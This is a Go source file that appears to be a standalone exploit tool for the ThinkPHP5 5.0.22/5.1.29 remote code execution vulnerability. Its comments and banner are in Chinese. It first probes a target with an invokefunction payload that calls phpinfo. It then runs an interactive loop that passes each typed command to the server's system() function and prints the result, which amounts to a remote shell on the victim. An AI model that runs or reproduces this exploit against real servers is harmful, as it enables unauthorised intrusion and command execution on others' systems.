package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

// 客户端全局变量
var Client http.Client

func banner(){
	fmt.Println(`
	 ____   ____      _    _____           _      _     ____
	 \ \ \ / ___|   _| |__|___ / _ __ _ __/ | ___| | __/ / /
	  \ \ \ |  | | | | '_ \ |_ \| '__| '__| |/ __| |/ / / / 
	  / / / |__| |_| | |_) |__) | |  | |  | | (__|   <\ \ \ 
	 /_/_/ \____\__, |_.__/____/|_|  |_|  |_|\___|_|\_\\_\_\
	            |___/                                       

	        ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
`)
}

/* *
参数检查
*/

func argsCheck(args []string) {

	if len(args) != 2 {
		fmt.Printf("参数:\n\t./%s <地址>\n", args[0])
		os.Exit(0)
	}
}

/* *
url处理
*/
func urlHandler(target string) string {
	// 没有http前缀的添加http前缀
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}
	// 有/结尾的就去掉/
	if strings.HasSuffix(target, "/") {    // 去掉后缀 /
		target = strings.TrimSuffix(target, "/")
		fmt.Println(target)
	}

	return target
}

func check(target string) bool {
	// 创建请求
	vulurl := target + "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
	req, _ := http.Get(vulurl)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")
	// 发起请求
	defer req.Body.Close()
	body, _ := ioutil.ReadAll(req.Body)
	//fmt.Println(string(body))
	//  校验存在phpinfo页面出现
	if strings.Contains(string(body), "PHP Version") {
		return true
	}
	return false
}

func exp(target string, command string)  {
	vulurl := target + "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]="+ command
	req, _ := http.Get(vulurl)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0")
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")
	// 发起请求
	defer req.Body.Close()
	body, _ := ioutil.ReadAll(req.Body)
	fmt.Println(string(body))
}


func main()  {
	banner()
	args := os.Args
	argsCheck(args)
	target := args[1]
	target = urlHandler(target)
	//check(target)
	if check(target) {
		fmt.Printf("地址: %s 存在漏洞", target)
		var command string
		for {
			for {
				fmt.Printf("\n\ncommand: ")
				fmt.Scanln(&command)
				if command != "" {
					break
				}
			}
			exp(target, command)
		}
	} else {
		fmt.Printf("地址: %s 不存在漏洞", target)
	}
}
